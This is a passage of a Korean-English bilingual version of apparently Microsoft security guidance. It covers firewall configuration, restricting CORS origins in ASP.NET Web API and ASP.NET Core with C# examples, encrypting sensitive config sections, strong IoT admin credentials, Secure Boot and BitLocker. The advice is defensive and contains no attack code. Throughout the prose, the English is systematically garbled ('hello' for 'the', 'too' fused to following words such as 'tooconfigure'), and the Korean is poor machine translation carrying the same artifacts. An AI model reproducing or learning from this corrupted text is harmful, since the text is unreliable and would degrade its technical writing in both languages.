| <span data-ttu-id="47493-397">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-397">**References**</span></span>              | <span data-ttu-id="47493-398">[Tooconfigure Azure SQL 데이터베이스 방화벽](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [데이터베이스 엔진 액세스에 대 한 Windows 방화벽 구성](https://msdn.microsoft.com/library/ms175043)</span><span class="sxs-lookup"><span data-stu-id="47493-398">[How tooconfigure an Azure SQL database firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Configure a Windows Firewall for Database Engine Access](https://msdn.microsoft.com/library/ms175043)</span></span> |
| <span data-ttu-id="47493-399">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-399">**Steps**</span></span> | <span data-ttu-id="47493-400">방화벽 시스템 리소스에 무단으로 액세스 toocomputer 방지할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-400">Firewall systems help prevent unauthorized access toocomputer resources.</span></span> <span data-ttu-id="47493-401">tooaccess 방화벽을 통해 hello SQL Server 데이터베이스 엔진의 인스턴스를 SQL Server tooallow 액세스를 실행 하는 hello 컴퓨터에서 hello 방화벽을 구성 해야</span><span class="sxs-lookup"><span data-stu-id="47493-401">tooaccess an instance of hello SQL Server Database Engine through a firewall, you must configure hello firewall on hello computer running SQL Server tooallow access</span></span> |

## <span data-ttu-id="47493-402"><a id="cors-api"></a>ASP.NET Web API에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-402"><a id="cors-api"></a>Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web API</span></span>

| <span data-ttu-id="47493-403">제목</span><span class="sxs-lookup"><span data-stu-id="47493-403">Title</span></span>                   | <span data-ttu-id="47493-404">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-404">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-405">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-405">**Component**</span></span>               | <span data-ttu-id="47493-406">Web API</span><span class="sxs-lookup"><span data-stu-id="47493-406">Web API</span></span> | 
| <span data-ttu-id="47493-407">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-407">**SDL Phase**</span></span>               | <span data-ttu-id="47493-408">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-408">Build</span></span> |  
| <span data-ttu-id="47493-409">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-409">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-410">MVC 5</span><span class="sxs-lookup"><span data-stu-id="47493-410">MVC 5</span></span> |
| <span data-ttu-id="47493-411">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-411">**Attributes**</span></span>              | <span data-ttu-id="47493-412">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-412">N/A</span></span>  |
| <span data-ttu-id="47493-413">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-413">**References**</span></span>              | <span data-ttu-id="47493-414">[ASP.NET Web API 2에서 원본 간 요청 사용](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)(영문), [ASP.NET Web API - ASP.NET Web API 2에서 CORS 지원](https://msdn.microsoft.com/magazine/dn532203.aspx)(영문)</span><span class="sxs-lookup"><span data-stu-id="47493-414">[Enabling Cross-Origin Requests in ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - CORS Support in ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx)</span></span> |
| <span data-ttu-id="47493-415">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-415">**Steps**</span></span> | <p><span data-ttu-id="47493-416">브라우저 보안 AJAX 요청 tooanother 도메인에서 웹 페이지를 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-416">Browser security prevents a web page from making AJAX requests tooanother domain.</span></span> <span data-ttu-id="47493-417">이 제한은 hello 동일 원본 정책 이라고 하 고 다른 사이트에서 중요 한 데이터를 읽는 악성 사이트를 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-417">This restriction is called hello same-origin policy, and prevents a malicious site from reading sensitive data from another site.</span></span> <span data-ttu-id="47493-418">그러나 경우에 따라 수 수 필요한 tooexpose Api 안전 하 게 소비할 수 있는 다른 사이트입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-418">However, sometimes it might be required tooexpose APIs securely which other sites can consume.</span></span> <span data-ttu-id="47493-419">교차 원본 리소스 공유 (CORS)는 toorelax hello 동일 원본 정책 서버에 있도록 W3C 표준입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-419">Cross Origin Resource Sharing (CORS) is a W3C standard that allows a server toorelax hello same-origin policy.</span></span></p><p><span data-ttu-id="47493-420">CORS를 사용하면 서버에서 명시적으로 일부 원본 간 요청을 허용하는 한편 다른 요청은 거부할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-420">Using CORS, a server can explicitly allow some cross-origin requests while rejecting others.</span></span> <span data-ttu-id="47493-421">CORS는 JSONP와 같은 이전 기술보다 더 안전하고 유연합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-421">CORS is safer and more flexible than earlier techniques such as JSONP.</span></span></p>|

### <a name="example"></a><span data-ttu-id="47493-422">예제</span><span class="sxs-lookup"><span data-stu-id="47493-422">Example</span></span>
<span data-ttu-id="47493-423">Hello App_Start/WebApiConfig.cs에서 코드 toohello WebApiConfig.Register 메서드 뒤 hello 추가</span><span class="sxs-lookup"><span data-stu-id="47493-423">In hello App_Start/WebApiConfig.cs, add hello following code toohello WebApiConfig.Register method</span></span> 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a><span data-ttu-id="47493-424">예제</span><span class="sxs-lookup"><span data-stu-id="47493-424">Example</span></span>
<span data-ttu-id="47493-425">EnableCors 특성은 컨트롤러에 적용 된 tooaction 메서드를 다음과 같을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-425">EnableCors attribute can be applied tooaction methods in a controller as follows:</span></span> 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

<span data-ttu-id="47493-426">EnableCors 특성에 대 한 원본 목록 hello 중요 tooensure는 설정 되어 하십시오 원본 tooa 유한 및 신뢰할 수 있는 집합입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-426">Please note that it is critical tooensure that hello list of origins in EnableCors attribute is set tooa finite and trusted set of origins.</span></span> <span data-ttu-id="47493-427">이 부적절 하 게 tooconfigure 실패 (예: hello 값으로 설정 ' *') 악성 사이트 tootrigger 교차 원본 요청 toohello API 아무런 제한 없이 사용 하면 > hello API 취약 tooCSRF 공격을 받으므로 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-427">Failing tooconfigure this inappropriately (e.g., setting hello value as '*') will allow malicious sites tootrigger cross origin requests toohello API without any restrictions, >thereby making hello API vulnerable tooCSRF attacks.</span></span> <span data-ttu-id="47493-428">EnableCors는 컨트롤러 수준에서 데코레이팅할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-428">EnableCors can be decorated at controller level.</span></span> 

### <a name="example"></a><span data-ttu-id="47493-429">예제</span><span class="sxs-lookup"><span data-stu-id="47493-429">Example</span></span>
<span data-ttu-id="47493-430">클래스에는 특정 방법에 CORS toodisable hello DisableCors 아래와 같이 특성을 사용할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-430">toodisable CORS on a particular method in a class, hello DisableCors attribute can be used as shown below:</span></span> 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| <span data-ttu-id="47493-431">제목</span><span class="sxs-lookup"><span data-stu-id="47493-431">Title</span></span>                   | <span data-ttu-id="47493-432">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-432">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-433">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-433">**Component**</span></span>               | <span data-ttu-id="47493-434">Web API</span><span class="sxs-lookup"><span data-stu-id="47493-434">Web API</span></span> | 
| <span data-ttu-id="47493-435">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-435">**SDL Phase**</span></span>               | <span data-ttu-id="47493-436">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-436">Build</span></span> |  
| <span data-ttu-id="47493-437">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-437">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-438">MVC 6</span><span class="sxs-lookup"><span data-stu-id="47493-438">MVC 6</span></span> |
| <span data-ttu-id="47493-439">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-439">**Attributes**</span></span>              | <span data-ttu-id="47493-440">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-440">N/A</span></span>  |
| <span data-ttu-id="47493-441">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-441">**References**</span></span>              | <span data-ttu-id="47493-442">[ASP.NET Core 1.0에서 CORS(원본 간 요청) 사용](https://docs.asp.net/en/latest/security/cors.html)(영문)</span><span class="sxs-lookup"><span data-stu-id="47493-442">[Enabling Cross-Origin Requests (CORS) in ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html)</span></span> |
| <span data-ttu-id="47493-443">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-443">**Steps**</span></span> | <p><span data-ttu-id="47493-444">ASP.NET Core 1.0에서 CORS는 미들웨어 또는 MVC를 통해 사용하도록 설정할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-444">In ASP.NET Core 1.0, CORS can be enabled either using middleware or using MVC.</span></span> <span data-ttu-id="47493-445">MVC tooenable CORS hello 같은 CORS 서비스는 사용 되지만 hello를 사용 하는 경우 CORS 미들웨어가 않습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-445">When using MVC tooenable CORS hello same CORS services are used, but hello CORS middleware is not.</span></span></p>|

<span data-ttu-id="47493-446">**접근 방식 1** 활성화 CORS 미들웨어를: hello 전체 응용 프로그램에 대 한 CORS tooenable hello UseCors 확장 메서드를 사용 하 여 hello CORS 미들웨어 toohello 요청 파이프라인을 추가 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-446">**Approach-1** Enabling CORS with middleware: tooenable CORS for hello entire application add hello CORS middleware toohello request pipeline using hello UseCors extension method.</span></span> <span data-ttu-id="47493-447">크로스-원본 정책 hello CorsPolicyBuilder 클래스를 사용 하 여 hello CORS 미들웨어를 추가 하는 경우 지정할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-447">A cross-origin policy can be specified when adding hello CORS middleware using hello CorsPolicyBuilder class.</span></span> <span data-ttu-id="47493-448">두 가지 방법으로 toodo이</span><span class="sxs-lookup"><span data-stu-id="47493-448">There are two ways toodo this:</span></span>

### <a name="example"></a><span data-ttu-id="47493-449">예제</span><span class="sxs-lookup"><span data-stu-id="47493-449">Example</span></span>
<span data-ttu-id="47493-450">hello에는 먼저 toocall UseCors 람다 사용 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-450">hello first is toocall UseCors with a lambda.</span></span> <span data-ttu-id="47493-451">hello 람다는 CorsPolicyBuilder 개체를 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-451">hello lambda takes a CorsPolicyBuilder object:</span></span> 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a><span data-ttu-id="47493-452">예제</span><span class="sxs-lookup"><span data-stu-id="47493-452">Example</span></span>
<span data-ttu-id="47493-453">두 번째 hello 하나 toodefine 되었거나 이상의 명명 된 CORS 정책 및 선택 hello 정책 이름으로 런타임 시.</span><span class="sxs-lookup"><span data-stu-id="47493-453">hello second is toodefine one or more named CORS policies, and then select hello policy by name at run time.</span></span> 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

<span data-ttu-id="47493-454">**접근 방식 2** MVC에서 CORS를 사용 하도록 설정: 개발자 수 또는 사용 하 여 MVC tooapply 작업당: 컨트롤러 당 또는 전체적으로 모든 컨트롤러에 대 한 특정 CORS 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-454">**Approach-2** Enabling CORS in MVC: Developers can alternatively use MVC tooapply specific CORS per action, per controller, or globally for all controllers.</span></span>

### <a name="example"></a><span data-ttu-id="47493-455">예제</span><span class="sxs-lookup"><span data-stu-id="47493-455">Example</span></span>
<span data-ttu-id="47493-456">작업당: 특정 작업에 대 한 CORS 정책을 toospecify hello [EnableCors] 특성 toohello 동작을 추가 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-456">Per action: toospecify a CORS policy for a specific action add hello [EnableCors] attribute toohello action.</span></span> <span data-ttu-id="47493-457">Hello 정책 이름을 지정 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-457">Specify hello policy name.</span></span> 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a><span data-ttu-id="47493-458">예제</span><span class="sxs-lookup"><span data-stu-id="47493-458">Example</span></span>
<span data-ttu-id="47493-459">컨트롤러별:</span><span class="sxs-lookup"><span data-stu-id="47493-459">Per controller:</span></span> 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a><span data-ttu-id="47493-460">예제</span><span class="sxs-lookup"><span data-stu-id="47493-460">Example</span></span>
<span data-ttu-id="47493-461">전역적으로:</span><span class="sxs-lookup"><span data-stu-id="47493-461">Globally:</span></span> 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
<span data-ttu-id="47493-462">EnableCors 특성에 대 한 원본 목록 hello 중요 tooensure는 설정 되어 하십시오 원본 tooa 유한 및 신뢰할 수 있는 집합입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-462">Please note that it is critical tooensure that hello list of origins in EnableCors attribute is set tooa finite and trusted set of origins.</span></span> <span data-ttu-id="47493-463">이 부적절 하 게 tooconfigure 실패 (예: hello 값으로 설정 ' *') 악성 사이트 tootrigger 교차 원본 요청 toohello API 아무런 제한 없이 사용 하면 > hello API 취약 tooCSRF 공격을 받으므로 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-463">Failing tooconfigure this inappropriately (e.g., setting hello value as '*') will allow malicious sites tootrigger cross origin requests toohello API without any restrictions, >thereby making hello API vulnerable tooCSRF attacks.</span></span> 

### <a name="example"></a><span data-ttu-id="47493-464">예제</span><span class="sxs-lookup"><span data-stu-id="47493-464">Example</span></span>
<span data-ttu-id="47493-465">컨트롤러 또는 동작을 사용 하 여 hello [DisableCors] 특성에 대 한 CORS toodisable 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-465">toodisable CORS for a controller or action, use hello [DisableCors] attribute.</span></span> 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <span data-ttu-id="47493-466"><a id="config-sensitive"></a>중요한 데이터가 포함된 Web API 구성 파일의 섹션 암호화</span><span class="sxs-lookup"><span data-stu-id="47493-466"><a id="config-sensitive"></a>Encrypt sections of Web API's configuration files that contain sensitive data</span></span>

| <span data-ttu-id="47493-467">제목</span><span class="sxs-lookup"><span data-stu-id="47493-467">Title</span></span>                   | <span data-ttu-id="47493-468">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-468">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-469">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-469">**Component**</span></span>               | <span data-ttu-id="47493-470">Web API</span><span class="sxs-lookup"><span data-stu-id="47493-470">Web API</span></span> | 
| <span data-ttu-id="47493-471">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-471">**SDL Phase**</span></span>               | <span data-ttu-id="47493-472">배포</span><span class="sxs-lookup"><span data-stu-id="47493-472">Deployment</span></span> |  
| <span data-ttu-id="47493-473">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-473">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-474">일반</span><span class="sxs-lookup"><span data-stu-id="47493-474">Generic</span></span> |
| <span data-ttu-id="47493-475">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-475">**Attributes**</span></span>              | <span data-ttu-id="47493-476">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-476">N/A</span></span>  |
| <span data-ttu-id="47493-477">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-477">**References**</span></span>              | <span data-ttu-id="47493-478">[방법: ASP.NET 2.0 사용 하 여 DPAPI에서 구성 섹션 암호화](https://msdn.microsoft.com/library/ff647398.aspx), [보호 되는 구성 공급자를 지정 하](https://msdn.microsoft.com/library/68ze1hb2.aspx), [tooprotect 응용 프로그램 암호를 사용 하 여 Azure 키 자격 증명 모음](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/)</span><span class="sxs-lookup"><span data-stu-id="47493-478">[How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Specifying a Protected Configuration Provider](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Using Azure Key Vault tooprotect application secrets](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/)</span></span> |
| <span data-ttu-id="47493-479">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-479">**Steps**</span></span> | <span data-ttu-id="47493-480">같은 hello Web.config 구성 파일, appsettings.json은 종종 toohold 중요 한 정보를 사용자 이름, 암호, 데이터베이스 연결 문자열 및 암호화 키를 포함 하는 데 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-480">Configuration files such as hello Web.config, appsettings.json are often used toohold sensitive information, including user names, passwords, database connection strings, and encryption keys.</span></span> <span data-ttu-id="47493-481">이 정보를 보호 하지 않는 경우 취약 tooattackers 또는 악의적인 사용자가 계정 사용자 이름 및 암호, 데이터베이스 이름 및 서버 이름이 같은 중요 한 정보를 가져오는 응용 프로그램은 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-481">If you do not protect this information, your application is vulnerable tooattackers or malicious users obtaining sensitive information such as account user names and passwords, database names and server names.</span></span> <span data-ttu-id="47493-482">Hello 배포 형식 (azure/온-프레미스)에 based, hello DPAPI 또는 Azure 키 자격 증명 모음와 같은 서비스를 사용 하 여 구성 파일의 중요 한 섹션을 암호화 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-482">Based on hello deployment type (azure/on-prem), encrypt hello sensitive sections of config files using DPAPI or services like Azure Key Vault.</span></span> |

## <span data-ttu-id="47493-483"><a id="admin-strong"></a>모든 관리 인터페이스를 강력한 자격 증명으로 보호하는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-483"><a id="admin-strong"></a>Ensure that all admin interfaces are secured with strong credentials</span></span>

| <span data-ttu-id="47493-484">제목</span><span class="sxs-lookup"><span data-stu-id="47493-484">Title</span></span>                   | <span data-ttu-id="47493-485">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-485">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-486">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-486">**Component**</span></span>               | <span data-ttu-id="47493-487">IoT 장치</span><span class="sxs-lookup"><span data-stu-id="47493-487">IoT Device</span></span> | 
| <span data-ttu-id="47493-488">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-488">**SDL Phase**</span></span>               | <span data-ttu-id="47493-489">배포</span><span class="sxs-lookup"><span data-stu-id="47493-489">Deployment</span></span> |  
| <span data-ttu-id="47493-490">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-490">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-491">일반</span><span class="sxs-lookup"><span data-stu-id="47493-491">Generic</span></span> |
| <span data-ttu-id="47493-492">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-492">**Attributes**</span></span>              | <span data-ttu-id="47493-493">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-493">N/A</span></span>  |
| <span data-ttu-id="47493-494">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-494">**References**</span></span>              | <span data-ttu-id="47493-495">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-495">N/A</span></span>  |
| <span data-ttu-id="47493-496">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-496">**Steps**</span></span> | <span data-ttu-id="47493-497">Hello 장치를 관리 인터페이스 또는 강력한 자격 증명을 사용 하 여 필드 게이트웨이 노출 보호 되어야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-497">Any administrative interfaces that hello device or field gateway exposes should be secured using strong credentials.</span></span> <span data-ttu-id="47493-498">또한 WiFi, SSH, 파일 공유, FTP와 같이 공개된 다른 인터페이스도 모두 강력한 자격 증명으로 보호해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-498">Also, any other exposed interfaces like WiFi, SSH, File shares, FTP should be secured with strong credentials.</span></span> <span data-ttu-id="47493-499">기본적인 약한 암호는 사용하면 안됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-499">Default weak passwords should not be used.</span></span> |

## <span data-ttu-id="47493-500"><a id="unknown-exe"></a>장치에서 알 수 없는 코드를 실행할 수 없는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-500"><a id="unknown-exe"></a>Ensure that unknown code cannot execute on devices</span></span>

| <span data-ttu-id="47493-501">제목</span><span class="sxs-lookup"><span data-stu-id="47493-501">Title</span></span>                   | <span data-ttu-id="47493-502">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-502">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-503">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-503">**Component**</span></span>               | <span data-ttu-id="47493-504">IoT 장치</span><span class="sxs-lookup"><span data-stu-id="47493-504">IoT Device</span></span> | 
| <span data-ttu-id="47493-505">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-505">**SDL Phase**</span></span>               | <span data-ttu-id="47493-506">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-506">Build</span></span> |  
| <span data-ttu-id="47493-507">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-507">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-508">일반</span><span class="sxs-lookup"><span data-stu-id="47493-508">Generic</span></span> |
| <span data-ttu-id="47493-509">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-509">**Attributes**</span></span>              | <span data-ttu-id="47493-510">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-510">N/A</span></span>  |
| <span data-ttu-id="47493-511">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-511">**References**</span></span>              | [<span data-ttu-id="47493-512">Windows 10 IoT Core에서 보안 부팅 및 bit-locker 장치 암호화 사용</span><span class="sxs-lookup"><span data-stu-id="47493-512">Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core</span></span>](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| <span data-ttu-id="47493-513">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-513">**Steps**</span></span> | <span data-ttu-id="47493-514">UEFI 보안 부팅 hello 시스템 제한 tooonly 지정된 기관에서 서명 된 이진 파일의 실행을 허용 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-514">UEFI Secure Boot restricts hello system tooonly allow execution of binaries signed by a specified authority.</span></span> <span data-ttu-id="47493-515">이 기능은 hello 플랫폼에서 실행 하 고 잠재적으로 그 hello 보안 상태를 약화 되 알 수 없는 코드를 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-515">This feature prevents unknown code from being executed on hello platform and potentially weakening hello security posture of it.</span></span> <span data-ttu-id="47493-516">UEFI 보안 부팅을 사용 하도록 설정 하 고 코드 서명 하는 것에 대 한 신뢰할 수 있는 인증 기관 목록은 hello를 제한 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-516">Enable UEFI Secure Boot and restrict hello list of certificate authorities that are trusted for signing code.</span></span> <span data-ttu-id="47493-517">Hello 신뢰할 수 있는 기관 중 하나를 사용 하 여 hello 장치에 배포 된 모든 코드에 서명 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-517">Sign all code that is deployed on hello device using one of hello trusted authorities.</span></span> |

## <span data-ttu-id="47493-518"><a id="partition-iot"></a>bit-locker를 사용하여 OS 및 IoT 장치의 추가 파티션 암호화</span><span class="sxs-lookup"><span data-stu-id="47493-518"><a id="partition-iot"></a>Encrypt OS and additional partitions of IoT Device with bit-locker</span></span>

| <span data-ttu-id="47493-519">제목</span><span class="sxs-lookup"><span data-stu-id="47493-519">Title</span></span>                   | <span data-ttu-id="47493-520">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-520">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-521">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-521">**Component**</span></span>               | <span data-ttu-id="47493-522">IoT 장치</span><span class="sxs-lookup"><span data-stu-id="47493-522">IoT Device</span></span> | 
| <span data-ttu-id="47493-523">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-523">**SDL Phase**</span></span>               | <span data-ttu-id="47493-524">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-524">Build</span></span> |  
| <span data-ttu-id="47493-525">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-525">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-526">일반</span><span class="sxs-lookup"><span data-stu-id="47493-526">Generic</span></span> |
| <span data-ttu-id="47493-527">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-527">**Attributes**</span></span>              | <span data-ttu-id="47493-528">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-528">N/A</span></span>  |
| <span data-ttu-id="47493-529">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-529">**References**</span></span>              | <span data-ttu-id="47493-530">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-530">N/A</span></span>  |
| <span data-ttu-id="47493-531">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-531">**Steps**</span></span> | <span data-ttu-id="47493-532">Windows 10 IoT Core 경량 버전의 hello 플랫폼에서 hello 필요한 측정을 수행 하는 UEFI에서 hello 필요한 preOS 프로토콜을 포함 하 여 TPM의 hello 존재에 강력한 종속 비트 보관 장치 암호화를 구현 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-532">Windows 10 IoT Core implements a lightweight version of bit-locker Device Encryption, which has a strong dependency on hello presence of a TPM on hello platform, including hello necessary preOS protocol in UEFI that conducts hello necessary measurements.</span></span> <span data-ttu-id="47493-533">이러한 preOS 측정 운영 체제의 hello OS가 시작 하는 방법을 선언적 레코드는 나중에 해당 hello를 확인 합니다. OS 사용 하 여 파티션을 비트 보관 및 모든 추가 파티션을 중요 한 데이터를 저장 하는 경우를 암호화 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-533">These preOS measurements ensure that hello OS later has a definitive record of how hello OS was launched.Encrypt OS partitions using bit-locker and any additional partitions also in case they store any sensitive data.</span></span> |

## <span data-ttu-id="47493-534"><a id="min-enable"></a>장치에만 hello 최소 서비스/기능이 활성화 되어 있는지 확인 하십시오.</span><span class="sxs-lookup"><span data-stu-id="47493-534"><a id="min-enable"></a>Ensure that only hello minimum services/features are enabled on devices</span></span>

